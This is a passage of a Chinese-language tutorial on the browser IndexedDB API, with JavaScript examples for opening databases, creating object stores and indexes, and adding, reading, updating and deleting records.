<h5 id="_24">出现原因<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h5>
<p>数据量增大，如果数据存储在浏览器，那么不需要从服务器发送很多信息，直接从本地获取信息。现在本地存储中，cookie数据量很小（4k），每次请求必须携带cookie。LocalStorage 数据量2.5-10MB，不能搜索，不能建立自定义的索引。IndexedDB 类似浏览器提供的数据库，JS脚本可以操作数据库，不属于关系型数据库（不能用SQL语言查询），属于NoSQL数据库。</p>
<h5 id="_25">特点<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h5>
<ul>
<li>键值对存储，所有类型的数据（包括JS对象）可以转化成键值对（类似JSON？）存储。每一条数据记录对应唯一的主键</li>
<li>异步：数据库的读写和JS脚本是异步的，LocalStorage是同步任务，所以操作数据库不会阻塞脚本</li>
<li>支持事务 transaction 如果一个操作出现错误，那么整个事务会取消，已修改的数据会复原，不会出现修改一半的数据</li>
<li>同源限制，数据库对应单独的域名</li>
<li>存储量大，一半大于250MB</li>
<li>支持二进制数据 ArrayBuffer 或者Blob数据 </li>
</ul>
<h5 id="_26">分类<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h5>
<p>IndexDB 很复杂，包括下面的各种子对象和API。数据库中名词对应这个的对象。</p>
<ul>
<li>数据库：IDB Database 对象：每一个URL可以对应多个数据库。IDB 有数据库的版本，同一时间内只能出现一个数据库，如果修改数据库的结构（增删数据表、索引或者主键）只有升级数据库的版本。</li>
<li>对象仓库：IDB ObjectStore 对象：一个数据库包括多个对象仓库（类似于关系型数据库中的数据表）</li>
<li>数据记录：类似于关系型数据库的行，包括主键和数据体，主键是默认的唯一的索引，可以是记录中的一个属性（ID），或者是一个自增长的整数编号。数据体的数据类型不限制。<code>{ id: 'qo9u', text: 'foo' }</code> 例如这个数据记录的主键是id，数据体是text。</li>
<li>索引： IDB Index 对象：为了加速数据检索，在数据表中为不同的属性建立索引。</li>
<li>事务： IDB Transaction 对象：数据的增删改通过事务完成</li>
<li>操作请求：IDB Request 对象</li>
<li>指针： IDB Cursor 对象</li>
<li>主键集合：IDB KeyRange 对象</li>
</ul>
<h4 id="2idb">2、IDB 基本操作<a class="headerlink" href="#2idb" title="Permanent link">&para;</a></h4>
<h5 id="21">2.1 打开数据库<a class="headerlink" href="#21" title="Permanent link">&para;</a></h5>
<p>使用 IndexedDB 的第一步是打开数据库，使用<code>indexedDB.open()</code>方法。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">let</span> <span class="nx">request</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">indexedDB</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">dbName</span><span class="p">,</span> <span class="nx">version</span><span class="p">);</span>
</code></pre></div>

<p>这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为<code>1</code>。</p>
<p><code>indexedDB.open()</code>方法返回一个 IDBRequest 对象。这个对象通过三种事件<code>error</code>、<code>success</code>、<code>upgradeneeded</code>，处理打开数据库的操作结果。</p>
<p><strong>（1）error 事件</strong></p>
<p><code>error</code>事件表示打开数据库失败。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">request</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;数据库打开报错&#39;</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div>

<p><strong>（2）success 事件</strong></p>
<p><code>success</code>事件表示成功打开数据库。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">db</span><span class="p">;</span>
<span class="nx">request</span><span class="p">.</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">db</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;数据库打开成功&#39;</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div>

<p>这时，通过<code>request</code>对象的<code>result</code>属性拿到数据库对象。</p>
<p><strong>（3）upgradeneeded 事件</strong></p>
<p>如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件<code>upgradeneeded</code>。这时通过事件对象的<code>target.result</code>属性，拿到数据库实例。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">db</span><span class="p">;</span>
<span class="nx">request</span><span class="p">.</span><span class="nx">onupgradeneeded</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">db</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<h5 id="22">2.2 新建数据库<a class="headerlink" href="#22" title="Permanent link">&para;</a></h5>
<p>新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在<code>upgradeneeded</code>事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。</p>
<p>通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">request</span><span class="p">.</span><span class="nx">onupgradeneeded</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>  
  <span class="nx">db</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">objectStore</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">createObjectStore</span><span class="p">(</span><span class="s1">&#39;person&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">keyPath</span><span class="o">:</span> <span class="s1">&#39;id&#39;</span> <span class="p">});</span>
<span class="p">}</span>
</code></pre></div>

<p>上面代码中，数据库新建成功以后，新增一张叫做<code>person</code>的表，主键是<code>id</code>。</p>
<p>更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">request</span><span class="p">.</span><span class="nx">onupgradeneeded</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">db</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">objectStore</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">db</span><span class="p">.</span><span class="nx">objectStoreNames</span><span class="p">.</span><span class="nx">contains</span><span class="p">(</span><span class="s1">&#39;person&#39;</span><span class="p">))</span> <span class="p">{</span>
    <span class="nx">objectStore</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">createObjectStore</span><span class="p">(</span><span class="s1">&#39;person&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">keyPath</span><span class="o">:</span> <span class="s1">&#39;id&#39;</span> <span class="p">});</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>主键（key）是默认建立索引的属性。比如，数据记录是<code>{ id: 1, name: '张三' }</code>，那么<code>id</code>属性可以作为主键。主键也可以指定为下一层对象的属性，比如<code>{ foo: { bar: 'baz' } }</code>的<code>foo.bar</code>也可以指定为主键。</p>
<p>如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键（自增长）。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">objectStore</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">createObjectStore</span><span class="p">(</span><span class="s1">&#39;person&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">autoIncrement</span><span class="o">:</span> <span class="kc">true</span> <span class="p">});</span>
</code></pre></div>

<p>上面代码中，指定主键为一个递增的整数。</p>
<p>新建对象仓库以后，下一步可以新建索引。</p>
<div class="codehilite"><pre><span></span><code><span class="nx">request</span><span class="p">.</span><span class="nx">onupgradeneeded</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">db</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">objectStore</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">createObjectStore</span><span class="p">(</span><span class="s1">&#39;person&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">keyPath</span><span class="o">:</span> <span class="s1">&#39;id&#39;</span> <span class="p">});</span>
  <span class="nx">objectStore</span><span class="p">.</span><span class="nx">createIndex</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">unique</span><span class="o">:</span> <span class="kc">false</span> <span class="p">});</span>
  <span class="nx">objectStore</span><span class="p">.</span><span class="nx">createIndex</span><span class="p">(</span><span class="s1">&#39;email&#39;</span><span class="p">,</span> <span class="s1">&#39;email&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">unique</span><span class="o">:</span> <span class="kc">true</span> <span class="p">});</span>
<span class="p">}</span>
</code></pre></div>

<p>上面代码中，<code>IDBObject.createIndex()</code>的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。</p>
<h5 id="23">2.3 新增数据<a class="headerlink" href="#23" title="Permanent link">&para;</a></h5>
<p>新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">function</span> <span class="nx">add</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">transaction</span><span class="p">([</span><span class="s1">&#39;person&#39;</span><span class="p">],</span> <span class="s1">&#39;readwrite&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">objectStore</span><span class="p">(</span><span class="s1">&#39;person&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">add</span><span class="p">({</span> <span class="nx">id</span><span class="o">:</span> <span class="mf">1</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mf">24</span><span class="p">,</span> <span class="nx">email</span><span class="o">:</span> <span class="s1">&#39;zhangsan@example.com&#39;</span> <span class="p">});</span>

  <span class="nx">request</span><span class="p">.</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;数据写入成功&#39;</span><span class="p">);</span>
  <span class="p">};</span>

  <span class="nx">request</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;数据写入失败&#39;</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nx">add</span><span class="p">();</span>
</code></pre></div>

<p>上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（“只读”或“读写”）。新建事务以后，通过<code>IDBTransaction.objectStore(name)</code>方法，拿到 IDBObjectStore 对象，再通过表格对象的<code>add()</code>方法，向表格写入一条记录。</p>
<p>写入操作是一个异步操作，通过监听连接对象的<code>success</code>事件和<code>error</code>事件，了解是否写入成功。</p>
<h5 id="24">2.4 读取数据<a class="headerlink" href="#24" title="Permanent link">&para;</a></h5>
<p>读取数据也是通过事务完成。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">function</span> <span class="nx">read</span><span class="p">()</span> <span class="p">{</span>
   <span class="kd">var</span> <span class="nx">transaction</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">transaction</span><span class="p">([</span><span class="s1">&#39;person&#39;</span><span class="p">]);</span>
   <span class="kd">var</span> <span class="nx">objectStore</span> <span class="o">=</span> <span class="nx">transaction</span><span class="p">.</span><span class="nx">objectStore</span><span class="p">(</span><span class="s1">&#39;person&#39;</span><span class="p">);</span>
   <span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">objectStore</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>

   <span class="nx">request</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
     <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;事务失败&#39;</span><span class="p">);</span>
   <span class="p">};</span>

   <span class="nx">request</span><span class="p">.</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Name: &#39;</span> <span class="o">+</span> <span class="nx">request</span><span class="p">.</span><span class="nx">result</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Age: &#39;</span> <span class="o">+</span> <span class="nx">request</span><span class="p">.</span><span class="nx">result</span><span class="p">.</span><span class="nx">age</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Email: &#39;</span> <span class="o">+</span> <span class="nx">request</span><span class="p">.</span><span class="nx">result</span><span class="p">.</span><span class="nx">email</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;未获得数据记录&#39;</span><span class="p">);</span>
      <span class="p">}</span>
   <span class="p">};</span>
<span class="p">}</span>

<span class="nx">read</span><span class="p">();</span>
</code></pre></div>

<p>上面代码中，<code>objectStore.get()</code>方法用于读取数据，参数是主键的值。</p>
<h5 id="25">2.5 遍历数据<a class="headerlink" href="#25" title="Permanent link">&para;</a></h5>
<p>遍历数据表格的所有记录，要使用指针对象 IDBCursor。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">function</span> <span class="nx">readAll</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">objectStore</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">transaction</span><span class="p">(</span><span class="s1">&#39;person&#39;</span><span class="p">).</span><span class="nx">objectStore</span><span class="p">(</span><span class="s1">&#39;person&#39;</span><span class="p">);</span>

  <span class="nx">objectStore</span><span class="p">.</span><span class="nx">openCursor</span><span class="p">().</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">cursor</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">cursor</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Id: &#39;</span> <span class="o">+</span> <span class="nx">cursor</span><span class="p">.</span><span class="nx">key</span><span class="p">);</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Name: &#39;</span> <span class="o">+</span> <span class="nx">cursor</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Age: &#39;</span> <span class="o">+</span> <span class="nx">cursor</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">age</span><span class="p">);</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Email: &#39;</span> <span class="o">+</span> <span class="nx">cursor</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">email</span><span class="p">);</span>
      <span class="nx">cursor</span><span class="p">.</span><span class="k">continue</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;没有更多数据了！&#39;</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">};</span>
<span class="p">}</span>

<span class="nx">readAll</span><span class="p">();</span>
</code></pre></div>

<p>上面代码中，新建指针对象的<code>openCursor()</code>方法是一个异步操作，所以要监听<code>success</code>事件。</p>
<h5 id="26">2.6 更新数据<a class="headerlink" href="#26" title="Permanent link">&para;</a></h5>
<p>更新数据要使用<code>IDBObject.put()</code>方法。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">function</span> <span class="nx">update</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">transaction</span><span class="p">([</span><span class="s1">&#39;person&#39;</span><span class="p">],</span> <span class="s1">&#39;readwrite&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">objectStore</span><span class="p">(</span><span class="s1">&#39;person&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">put</span><span class="p">({</span> <span class="nx">id</span><span class="o">:</span> <span class="mf">1</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;李四&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mf">35</span><span class="p">,</span> <span class="nx">email</span><span class="o">:</span> <span class="s1">&#39;lisi@example.com&#39;</span> <span class="p">});</span>

  <span class="nx">request</span><span class="p">.</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;数据更新成功&#39;</span><span class="p">);</span>
  <span class="p">};</span>

  <span class="nx">request</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;数据更新失败&#39;</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nx">update</span><span class="p">();</span>
</code></pre></div>

<p>上面代码中，<code>put()</code>方法自动更新了主键为<code>1</code>的记录。</p>
<h5 id="27">2.7 删除数据<a class="headerlink" href="#27" title="Permanent link">&para;</a></h5>
<p><code>IDBObjectStore.delete()</code>方法用于删除记录。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">function</span> <span class="nx">remove</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">transaction</span><span class="p">([</span><span class="s1">&#39;person&#39;</span><span class="p">],</span> <span class="s1">&#39;readwrite&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">objectStore</span><span class="p">(</span><span class="s1">&#39;person&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>

  <span class="nx">request</span><span class="p">.</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;数据删除成功&#39;</span><span class="p">);</span>
  <span class="p">};</span>
<span class="p">}</span>

<span class="nx">remove</span><span class="p">();</span>
</code></pre></div>

<h5 id="28">2.8 使用索引<a class="headerlink" href="#28" title="Permanent link">&para;</a></h5>
<p>索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。</p>
<p>假定新建表格的时候，对<code>name</code>字段建立了索引。</p>
<div class="codehilite"><pre><span></span><code>objectStore.createIndex(&#39;name&#39;, &#39;name&#39;, { unique: false });
</code></pre></div>

<p>现在，就可以从<code>name</code>找到对应的数据记录了。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">transaction</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">transaction</span><span class="p">([</span><span class="s1">&#39;person&#39;</span><span class="p">],</span> <span class="s1">&#39;readonly&#39;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">store</span> <span class="o">=</span> <span class="nx">transaction</span><span class="p">.</span><span class="nx">objectStore</span><span class="p">(</span><span class="s1">&#39;person&#39;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">index</span> <span class="o">=</span> <span class="nx">store</span><span class="p">.</span><span class="nx">index</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">index</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;李四&#39;</span><span class="p">);</span>

<span class="nx">request</span><span class="p">.</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// ...</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="c1">// ...</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<h4 id="3indexeddb-api">3、indexedDB 对象 API<a class="headerlink" href="#3indexeddb-api" title="Permanent link">&para;</a></h4>
<h5 id="indexeddbopen">indexedDB.open()<a class="headerlink" href="#indexeddbopen" title="Permanent link">&para;</a></h5>
<p><code>indexedDB.open()</code>方法用于打开数据库。这是一个异步操作，但是会立刻返回一个 IDBOpenDBRequest 对象。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">openRequest</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">indexedDB</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">,</span> <span class="mf">1</span><span class="p">);</span>
</code></pre></div>

<p>上面代码表示，打开一个名为<code>test</code>、版本为<code>1</code>的数据库。如果该数据库不存在，则会新建该数据库。</p>
<p><code>open()</code>方法的第一个参数是数据库名称，格式为字符串，不可省略；第二个参数是数据库版本，是一个大于<code>0</code>的正整数（<code>0</code>将报错），如果该参数大于当前版本，会触发数据库升级。第二个参数可省略，如果数据库已存在，将打开当前版本的数据库；如果数据库不存在，将创建该版本的数据库，默认版本为<code>1</code>。</p>
<p>打开数据库是异步操作，通过各种事件通知客户端。下面是有可能触发的4种事件。</p>
<ul>
<li><strong>success</strong>：打开成功。</li>
<li><strong>error</strong>：打开失败。</li>
<li><strong>upgradeneeded</strong>：第一次打开该数据库，或者数据库版本发生变化。</li>
<li><strong>blocked</strong>：上一次的数据库连接还未关闭。</li>
</ul>
<p>第一次打开数据库时，会先触发<code>upgradeneeded</code>事件，然后触发<code>success</code>事件。</p>
<p>根据不同的需要，对上面4种事件监听函数。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">openRequest</span> <span class="o">=</span> <span class="nx">indexedDB</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">,</span> <span class="mf">1</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">db</span><span class="p">;</span>

<span class="nx">openRequest</span><span class="p">.</span><span class="nx">onupgradeneeded</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Upgrading...&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">openRequest</span><span class="p">.</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Success!&#39;</span><span class="p">);</span>
  <span class="nx">db</span> <span class="o">=</span> <span class="nx">openRequest</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">openRequest</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Error&#39;</span><span class="p">);</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>上面代码有两个地方需要注意。首先，<code>open()</code>方法返回的是一个对象（IDBOpenDBRequest），监听函数就定义在这个对象上面。其次，<code>success</code>事件发生后，从<code>openRequest.result</code>属性可以拿到已经打开的<code>IndexedDB</code>数据库对象。</p>
<h5 id="indexeddbdeletedatabase">indexedDB.deleteDatabase()<a class="headerlink" href="#indexeddbdeletedatabase" title="Permanent link">&para;</a></h5>
<p><code>indexedDB.deleteDatabase()</code>方法用于删除一个数据库，参数为数据库的名字。它会立刻返回一个<code>IDBOpenDBRequest</code>对象，然后对数据库执行异步删除。删除操作的结果会通过事件通知，<code>IDBOpenDBRequest</code>对象可以监听以下事件。</p>
<ul>
<li><code>success</code>：删除成功</li>
<li><code>error</code>：删除报错</li>
</ul>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">DBDeleteRequest</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">indexedDB</span><span class="p">.</span><span class="nx">deleteDatabase</span><span class="p">(</span><span class="s1">&#39;demo&#39;</span><span class="p">);</span>

<span class="nx">DBDeleteRequest</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Error&#39;</span><span class="p">);</span>
<span class="p">};</span>

<span class="nx">DBDeleteRequest</span><span class="p">.</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;success&#39;</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div>

<p>调用<code>deleteDatabase()</code>方法以后，当前数据库的其他已经打开的连接都会接收到<code>versionchange</code>事件。</p>
<p>注意，删除不存在的数据库并不会报错。</p>
<h5 id="indexeddbcmp">indexedDB.cmp()<a class="headerlink" href="#indexeddbcmp" title="Permanent link">&para;</a></h5>
<p><code>indexedDB.cmp()</code>方法比较两个值是否为 indexedDB 的相同的主键。它返回一个整数，表示比较的结果：<code>0</code>表示相同，<code>1</code>表示第一个主键大于第二个主键，<code>-1</code>表示第一个主键小于第二个主键。</p>
<div class="codehilite"><pre><span></span><code>window.indexedDB.cmp(1, 2) // -1
</code></pre></div>

<p>注意，这个方法不能用来比较任意的 JavaScript 值。如果参数是布尔值或对象，它会报错。</p>
<div class="codehilite"><pre><span></span><code>window.indexedDB.cmp(1, true) // 报错
window.indexedDB.cmp({}, {}) // 报错
</code></pre></div>

<h5 id="idbrequest">IDBRequest 对象<a class="headerlink" href="#idbrequest" title="Permanent link">&para;</a></h5>
<p>==IDBRequest 对象表示打开的数据库连接==，<code>indexedDB.open()</code>方法和<code>indexedDB.deleteDatabase()</code>方法会返回这个对象。数据库的操作都是通过这个对象完成的。</p>
<p>这个对象的所有操作都是异步操作，要通过<code>readyState</code>属性判断是否完成，如果为<code>pending</code>就表示操作正在进行，如果为<code>done</code>就表示操作完成，可能成功也可能失败。</p>
<p>操作完成以后，触发<code>success</code>事件或<code>error</code>事件，这时可以通过<code>result</code>属性和<code>error</code>属性拿到操作结果。如果在<code>pending</code>阶段，就去读取这两个属性，是会报错的。</p>
<p>IDBRequest 对象有以下属性。</p>
<ul>
<li><code>IDBRequest.readyState</code>：等于<code>pending</code>表示操作正在进行，等于<code>done</code>表示操作正在完成。</li>
